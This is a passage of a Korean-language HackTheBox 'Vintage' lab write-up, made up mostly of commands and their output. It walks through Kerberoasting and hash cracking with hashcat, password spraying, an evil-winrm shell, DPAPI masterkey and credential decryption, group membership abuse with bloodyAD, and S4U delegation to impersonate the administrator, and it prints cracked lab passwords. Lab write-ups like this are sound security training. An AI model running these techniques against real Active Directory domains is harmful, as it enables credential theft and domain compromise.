3835018348e03361202a36a6503123bfe3cdd315c3b10b04bfaa7aca4ca05a73fcc1c04ae20e2c4278714eca11867dca8b4d51ff1cdebb596f9977a2a5c965df0cc7ba2a607fc47cc9d9d73a033d6b5cc8cac2195d21fb9713b29579f42b6a35a6f643567a4466a9ba9ace8cc613011da83cfeffac20e3ba775593ed04b8bf4fff54eded06456a993cbee8d2d3f1d6f45742fbeefdcbfdecfcc1055e8ec089f3ce99f8444fae51eaea90350409de1433f52218aecd67ea7af116a9baeac85d8ea40ba55115dc7432915ed89e40ae72d5f0841bc39315f52ac21144ddc45ac5de7067dc79a43acd6a095e1d1492e660b12c7151a284a4ee8a6de8009624ebfa39c0e9e8c16113b9e5f078a0fd05b8f1c09f698457203534470e7cb9c8b3854f06ce416fc0964698c10ea4d0e7b07a5a126f95240f25f760c871830b2f0af95dc4f4a1176702b2e204b554927d0b33e89f4        
LDAP        dc01.vintage.htb 389    DC01             [*] sAMAccountName: svc_ark, memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb, pwdLastSet: 2024-06-06 22:45:27.913095, lastLogon: <never>
LDAP        dc01.vintage.htb 389    DC01             $krb5tgs$23$*svc_ark$VINTAGE.HTB$vintage.htb\svc_ark*$de9c3eeb6bc264e42c81d0863a2563ea$b9070612afffcf85302bb8e441687c69c4380202d7595c33bfae6d45a5d5031d4876c00ff670b39fdc12450a2ba3810282f7ad585d411e5ac743a39d9bc36831f1111476f30097b957cff188e19af0fcd6da72d3f6222faf820a870bbce1c17e14fa6a102259ac326352e8156cf02cd622b8b4685daaefd6959c4eccdf77253f84eaceabd6e3ff2248a1534e176dd9e0f063f0fe44bf0da8eb477381f52dc24459af851cc500965dde9c5f0739083426a67d6464fa6054b379b37fae35e4c04efb52802d45602ea4a0c9587030b7478b890b34e6fb204208ecb5f533d2a3fdd6fe7e263f18c68ea422164e79a2c5acc443eb10e3943b900417ef0d0ecf4b532749e60808a08e86f02ec06c062f4ef57401603b5b909be7a348ffba669441481bb845504e06f2c6a77ea2be706d0b4590592fae1d16f2e07e974c59ae5a7456879bf74e847968376b5465f21ee5ec67aa738d9cb7de249358912ee7e96f9f6719b58291ea2196699e26ea6bf9fb454c1ccbdf414a58d5352ed15e453ac471fa63437474733416393ba201bdc7b045a228057a910670fd9df057bc71980e5c931f2ed21bc5c7e51fa813f87ced47faa6766189a787c42c22f273f30bd1e5e185085860d457ae5db787c0ea87be7233c22355422a554e16f8aeb6e88370e8288302450eb1ac29b7090b398d3947c1b2e9d0d38f1c1a18b3ddcfd4a743072f4d020d99269848cd74c5691c586808dba86efd3c94b20dc3f1dea6d3dfddd3dfd3901be11a8c563882386e99968fbffabdfcfb262d32805cb3944da082b017fb84e341ae03b212f37474e11a357b16cd048894b438dd49d0c2c6fc4a97403d32f3708859a6f271adae96fe266f331357db216c4ced819caccee1d9132d0a5e95a6f80e614d4be0333b942c15b6448d054673582ff2f6923f47e06cd6aae40b4634e72630ca8e3e3221451950c87652e9bdaf526f4480e506ce8cc3ed405285f8e63d8504e7aef253d46194c5bdb5391ec69e7479f7cd700f7f33230cb344d6b8d4f34c397deccff6d6674ebeaede3c3cc4b91df0cc71f2a4fa5ff5f1424a07920c1602f5d542b833bbac2864f53160dadbb84dcc0e8c4f71da5a418de2061e98b35919cbfb87e46ec6627c8dfb37cdffcaaa9fe0dcf595d921ce6f9a84dbae66d41a65e11e3e6f2d021bd8ba02c26180cecf69c22cc20bcab4acfc49d8430c1f71cbcb9dafbc1d8d6c4f71312a70121ab9fb45d4a9407e796f82483c9298e903266561c76cbff3c8e282e6a9b07d490a6969271dd716584936a873f3be654fdb6288bb031331d6ca9c90ce8121509fdf70465ef93cbbb28203dbf17cb55380606b6f8b48fb5d6e8df5771187faa7e27abc4239a5681ecb60df272c011e3cbbf0cc2388737a1fb54ca6960185d080abdba3f8cccbad67e327a324d90a90ec9b3419cbf402a958 
```


hashcat으로 평문 패스워드 획득 `Zer0the0ne`
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ hashcat svc.hash /usr/share/wordlists/rockyou.txt -m 13100
hashcat (v7.1.2) starting
...

$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$31bb8e5c8acebf865b193f42f483d6e8$f92f08bc7e085c3484d258b3ee1f62b49717e35412e1cf1b21154d7a33cd5a712819feef86c936bf582cfae576bc55e0bf0862bc159e2c155754206c0cd2c41e356426469b5d620941790db3cf1fbbfc1baa35119f60dc29f8c0e6630741458b61420b7851de517322a38f52180602f4bee8162abc38c1d5e4164c69b5dc69c0a678c940f26fe5f921282dc8719fdcfc6aef7ebc86a7858727eae5b9d49aba6dc813ec5a4b88fddb59440d54f8fe01207ed1ed9150fe5615bfe37695578071f51d1087288d953b0e4781440bca4f5b2596daafa50f50db63e22929a5fb453320bc1fc3a71be487d6d2b62610a31ffc1fc58ee65b0a17baf3bf54c377e4e47cd523ede229d2667cd2bad1bedcccfb36aa9356c1ac0ac97fcdbc104aeeb6960026a5f8e7bd7de37756b15b81bf797ffd5bf1635dd84c21dddce87e5f8cf027432db539a9cef71ac191dd4d9d464161b6fbf1cc513a20c5621ee45a79b31beb8f13705af6d586598019c2a12e1678e0664b4e965d35b2b91569bd86f93ee6b55ca35722e796da77cee1b89f270861e4902c321ee51f6a091de30095ead989da03728b7e4e39f762f99fe15c64e6cc8110a0bd60ecfc4836d9f93ca1c0279a0bc85fdb6ba4318493cfb8be9566c943f260e0dbb3c04eadc80d0e5c8ebdd5943983bf231b725d1e317951a9342b145c64adca0c2b7d02c6efdf50f6e949627f85521c3aa97975284d289a2f40b07504625639929465132eea39d55ccff9c18b7ff066957ab36639dbad586684add99726a261ceb9d8fab847fad5f3ef730450d6e08c57c11cb7f3cd5f9ff940a39637c65443c9d782a408d022b6a66539948f8835d8a77b2bd074b8376f1b241b4e1e3518d93344985566c8679c9aa17a3bbaf7ba877d348d5449c504dd3069881435241e9736a645fa3218a46e10ee6d74c267071ec8bdf355af99f66cd8361665927d1e04611f4d4adf928d0b099e387aca95c18c10f169532a578d1c048050861a678ef2f893a51a733bf72a2edca0581a0dcc8d4325ef3f575bdaa1b2d8142067b5c3d3242774614f3ffdcec887a2181c6be3965eb0a2f207c0725727d1e095159f62dbf620e80098e6009cf353ba443356202089013274e8eed5660a014f175021923689a5b68ff44900b02d655331c3b6d898d0884e0d2d6e8f99f89b4b16e3075de57c8f951f5039e9da52850e6ba23ce6341d5f74b4bfce5801bcec6c0a678ab69c5c59480134b3294629db0f9462d115c8f64e16221143b79c382d49f695ea5fef33471cfe0e115c4743a7c0e84bb5d8204c423ed96ff1eec47952f58b412f0b6e1fb6866cf3cf346d7de396f799a11d622f4d0764b4da012ad3dce180e83c8465fe5f9cd72951ef94e686b8921f3bea0ad337cbe8222ea397338b6da3cd6bf9f47ca13e5829cb6a31bca01936e0dd8b8d864ff3:Zer0the0ne

```


패스워드 유효성 확인
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ netexec smb dc01.vintage.htb -u svc_sql -p 'Zer0the0ne' -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                                
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\svc_sql:Zer0the0ne 

```


사용자 목록 획득 (bloodhound 활용)
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ cat bloodhound/20260319153925_users.json| jq '.data[].Properties | select(.samaccountname) | .samaccountname' -r 
L.Bianchi_adm
gMSA01$
svc_ark
C.Neri_adm
svc_ldap
C.Neri
svc_sql
P.Rosa
G.Viola
L.Bianchi
R.Verdi
M.Rossi
krbtgt
Guest
Administrator



```

획득한 유저명으로 패스워드 스프레이 어택 `C.Neri/Zer0the0ne`
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ netexec smb dc01.vintage.htb -u users.txt -p Zer0the0ne -k --continue-on-success
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                                
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\gMSA01$:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_ark:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\C.Neri_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_ldap:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\C.Neri:Zer0the0ne 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_sql:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\P.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\G.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\R.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\M.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\krbtgt:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Guest:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Administrator:Zer0the0ne KDC_ERR_PREAUTH_FAILED

```


Kerberos 세션 설정
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ kinit c.neri             
Password for c.neri@VINTAGE.HTB: 
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ klist       
Ticket cache: FILE:/home/kali/HTB/vintage/gmsa01$.ccache
Default principal: c.neri@VINTAGE.HTB

Valid starting       Expires              Service principal
03/19/2026 16:53:41  03/20/2026 02:53:41  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 03/20/2026 16:53:33

```

evil-winrm 인증 성공
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$  evil-winrm -i dc01.vintage.htb -r vintage.htb      
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Neri\Documents> 

```

user.txt 획득
![[Pasted image 20260319165553.png]]


마스터키 확인인
```bash
*Evil-WinRM* PS C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> ls -force


    Directory: C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred


```

다운로드 시도시 실패
```powershell
*Evil-WinRM* PS C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> download 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
                                        
Info: Downloading C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847 to 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847                                         
                                        
Error: Download failed. Check filenames or paths: uninitialized constant WinRM::FS::FileManager::EstandardError
*Evil-WinRM* PS C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> download 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
                                        
Info: Downloading C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b to 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b                                         
                                        
Error: Download failed. Check filenames or paths: uninitialized constant WinRM::FS::FileManager::EstandardError

```


base64 인코딩
```powershell
*Evil-WinRM* PS C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> 
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847'))^M*Evil-WinRM* PS C:\users\c.neri\appdata\Roa*Evil-WinRM* PS C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847'))
AgAAAAAAAAAAAAAANABkAGIAZgAwADQAZAA4AC0ANQAyADkAYgAtADQAYgA0AGMALQBiADQAYQBlAC0AOABlADgANwA1AGUANABmAGUAOAA0ADcAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA2or8mZsV0QcGzC0XUJ9K8FBGAAAJgAAAA2YAAJhSpSk/CQYorLpjFuO6lxoHg+a9CGghh0pqkMYfO5Irop3dQGYbS2b3KJo0qLO586XfAvV/0dK/fM8a4erXENVlgtsrHRG48O/VO0Egw0qMZld65hY3jxMWTkzfGqfjNK5ytEtwPHGkAgAAAFiAHjGrO47Qhcn7oxZZBrBQRgAACYAAAANmAABRlZY9IPg0gA9TOU3DaFwm1ylSDyf2HHVE2mTqFzwbK7ZHp2XH8Mx2rvk6EpPUtdIv4kkQU6GsO43Xyg+qcks13CkP8uIIo0ECAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwGUQAxdTpQrS3sEc8gVH9tmXllgaPOCz8cyowsRu8fkbCLFyIcsLVGKHQRv3PUJ1qmSeC604xcQlXI43XddWfFZ3tFF1yLQOSNwfbKDdGQiF3yTlYb6KoMvhQXzs1O1LLP2cUEFOGw8+Pg8uMN4KDBURRWfqmRksyn38bg3OKFSQ1K0CpdNzKfPvS6TnGuvHvnglzZdT5qwQ+nOdXFuJccenatjtlVgQNdp6yZOmpQjrkTtZOxz9b0JRsoOQS0NWu7WThQU4s8yeZkHaJRSJ5lohgdYpZiLJ4x1lG5jLz7/IX5pP6UK1cq5KwLjvaMdGsK9GDj3ofoB/OldTS7StCAXHfzvgjmTscAdxSARKV8ekuDWjsXgz7iZkV04lUG5Jo2FD9xrFdY1DqTSbr7oLdHAwzFBQX5RGnDhKFJXA0KJ29sz1zHGVn4/J4k0e/Hkop6YwRfEighbU=
*Evil-WinRM* PS C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b'))
AgAAAAAAAAAAAAAAOQA5AGMAZgA0ADEAYQAzAC0AYQA1ADUAMgAtADQAYwBmADcALQBhADgAZAA3AC0AYQBjAGEAMgBkADYAZgA3ADMAMwA5AGIAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA6o788ZIMNhaSpbkSX0mC01BGAAAJgAAAA2YAABAM9ZX6Z/40RYL/aC+dw/D5oa7WMYBN56zwgXYX4QrAIb4DtJoM27zWgMxygJ36SpSHHHQGJMgTs6nZN5U/1q7DBIpQlsWk15jpmUFS2czCScuP9C+dGdYT+p6AWb3L7PZUPqNDHqZRAgAAALFxHXdcOeYbfN6CsYeVaYZQRgAACYAAAANmAABiEtEJeAVpg4QA0lnUzAsf6koPtccl1os9yZrj1gTAc/oSmhBNPEE3/VVVPZw9g3NP26Wj3vO36IOmtsXWYABkukmijrSaAZUCAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwr2BFf0a0DhdM8JymBww6mzQt8tVsTbDmCZ/uZu3bzOAOUXODaGaJOOKqRm2W8rHPOZ27YjtD1pd0MFJDocNJwdhN5pwTdz2v2JsrVVVE363zZjXHeXefhuL5AMwMQr6gpTsCGcxrd1ziTN9Q1lH9QtnYE7OZlbrZPhiWO2vvdX+UQcKlgpxcSGLaczL53/UJXrvt9hueRn+YXxnK+fiyZ0gmjMlP+yuxOiKSvHM/UT6NmuYewnApQrOBO3A5F1XKHguHKT+VS187uBu/TO1ZT4/CrsKws1aG7EkIXhRKzEgukAwn5nZlU6YaADdeQRDzCR1D0ycJKFyZd4QE1Nt6Kbgr+ukbiurwBJd/D1a3+WWCw+S2OJVHB9qqlcW11heJd+v9eGe1Wf6/PYCvyyWMsvusF8XUswgKQbkH821vscyNmJWDwMply/ZvellKuGQ1/s5gVqUkALQ=


```

자격증명 파일도 동일하게 실행
```powershell
*Evil-WinRM* PS C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\roaming\microsoft\credentials\C4BB96844A5C9DD45D5B6A9859252BA6'))     
AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==
```

base64 디코딩
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ echo "AgAAAAAAAAAAAAAANABkAGIAZgAwADQAZAA4AC0ANQAyADkAYgAtADQAYgA0AGMALQBiADQAYQBlAC0AOABlADgANwA1AGUANABmAGUAOAA0ADcAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA2or8mZsV0QcGzC0XUJ9K8FBGAAAJgAAAA2YAAJhSpSk/CQYorLpjFuO6lxoHg+a9CGghh0pqkMYfO5Irop3dQGYbS2b3KJo0qLO586XfAvV/0dK/fM8a4erXENVlgtsrHRG48O/VO0Egw0qMZld65hY3jxMWTkzfGqfjNK5ytEtwPHGkAgAAAFiAHjGrO47Qhcn7oxZZBrBQRgAACYAAAANmAABRlZY9IPg0gA9TOU3DaFwm1ylSDyf2HHVE2mTqFzwbK7ZHp2XH8Mx2rvk6EpPUtdIv4kkQU6GsO43Xyg+qcks13CkP8uIIo0ECAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwGUQAxdTpQrS3sEc8gVH9tmXllgaPOCz8cyowsRu8fkbCLFyIcsLVGKHQRv3PUJ1qmSeC604xcQlXI43XddWfFZ3tFF1yLQOSNwfbKDdGQiF3yTlYb6KoMvhQXzs1O1LLP2cUEFOGw8+Pg8uMN4KDBURRWfqmRksyn38bg3OKFSQ1K0CpdNzKfPvS6TnGuvHvnglzZdT5qwQ+nOdXFuJccenatjtlVgQNdp6yZOmpQjrkTtZOxz9b0JRsoOQS0NWu7WThQU4s8yeZkHaJRSJ5lohgdYpZiLJ4x1lG5jLz7/IX5pP6UK1cq5KwLjvaMdGsK9GDj3ofoB/OldTS7StCAXHfzvgjmTscAdxSARKV8ekuDWjsXgz7iZkV04lUG5Jo2FD9xrFdY1DqTSbr7oLdHAwzFBQX5RGnDhKFJXA0KJ29sz1zHGVn4/J4k0e/Hkop6YwRfEighbU=" | base64 -d > 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847 
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ echo "AgAAAAAAAAAAAAAAOQA5AGMAZgA0ADEAYQAzAC0AYQA1ADUAMgAtADQAYwBmADcALQBhADgAZAA3AC0AYQBjAGEAMgBkADYAZgA3ADMAMwA5AGIAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA6o788ZIMNhaSpbkSX0mC01BGAAAJgAAAA2YAABAM9ZX6Z/40RYL/aC+dw/D5oa7WMYBN56zwgXYX4QrAIb4DtJoM27zWgMxygJ36SpSHHHQGJMgTs6nZN5U/1q7DBIpQlsWk15jpmUFS2czCScuP9C+dGdYT+p6AWb3L7PZUPqNDHqZRAgAAALFxHXdcOeYbfN6CsYeVaYZQRgAACYAAAANmAABiEtEJeAVpg4QA0lnUzAsf6koPtccl1os9yZrj1gTAc/oSmhBNPEE3/VVVPZw9g3NP26Wj3vO36IOmtsXWYABkukmijrSaAZUCAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwr2BFf0a0DhdM8JymBww6mzQt8tVsTbDmCZ/uZu3bzOAOUXODaGaJOOKqRm2W8rHPOZ27YjtD1pd0MFJDocNJwdhN5pwTdz2v2JsrVVVE363zZjXHeXefhuL5AMwMQr6gpTsCGcxrd1ziTN9Q1lH9QtnYE7OZlbrZPhiWO2vvdX+UQcKlgpxcSGLaczL53/UJXrvt9hueRn+YXxnK+fiyZ0gmjMlP+yuxOiKSvHM/UT6NmuYewnApQrOBO3A5F1XKHguHKT+VS187uBu/TO1ZT4/CrsKws1aG7EkIXhRKzEgukAwn5nZlU6YaADdeQRDzCR1D0ycJKFyZd4QE1Nt6Kbgr+ukbiurwBJd/D1a3+WWCw+S2OJVHB9qqlcW11heJd+v9eGe1Wf6/PYCvyyWMsvusF8XUswgKQbkH821vscyNmJWDwMply/ZvellKuGQ1/s5gVqUkALQ=" | base64 -d > 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b

┌──(kali㉿kali)-[~/HTB/vintage]
└─$ echo "AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==" |base64 -d > C4BB96844A5C9DD45D5B6A9859252BA6


```

dpapi를 통해 복호화 [실패]
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ impacket-dpapi masterkey -file 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847 -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f

```

다른 마스터키 복호화
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a

```

자격증명 복호화
```bash
──(kali㉿kali)-[~/HTB/vintage]
└─$ impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description : 
Unknown     : 
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312


```

획득한 자격증명 확인
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ netexec smb dc01.vintage.htb -u c.neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                                
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\c.neri_adm:Uncr4ck4bl3P4ssW0rd0312 
```


![[Pasted image 20260319171041.png]]
커버로스 티켓 발급

```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ export KRB5_CONFIG=$(pwd)/vintage-krb5.conf
                                                                                                                   
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ kinit c.neri_adm
Password for c.neri_adm@VINTAGE.HTB: 
                                                                                                                   
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ klist           
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: c.neri_adm@VINTAGE.HTB

Valid starting       Expires              Service principal
03/19/2026 17:15:24  03/20/2026 03:15:24  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 03/20/2026 17:15:09

```

tgt 등록

```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ KRB5CCNAME=/tmp/krb5cc_1000 bloodyAD -d vintage.htb -k --host dc01.vintage.htb -k add groupMember DelegatedAdmins 'fs01$'
[+] fs01$ added to DelegatedAdmins

```

fs01$ 티켓 재발급
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ kinit fs01$
Password for fs01$@VINTAGE.HTB: 
                                                                                                                   
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ klist                                                                   
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: fs01$@VINTAGE.HTB

Valid starting       Expires              Service principal
03/19/2026 17:23:46  03/20/2026 03:23:46  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 03/20/2026 17:23:43

```

ST발급


```bash

┌──(kali㉿kali)-[~/HTB/vintage]
└─$ impacket-getST -spn 'cifs/dc01.vintage.htb' \
-impersonate 'administrator' \
'vintage.htb/fs01$:fs01' \
-dc-ip 10.129.231.205       
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache

```



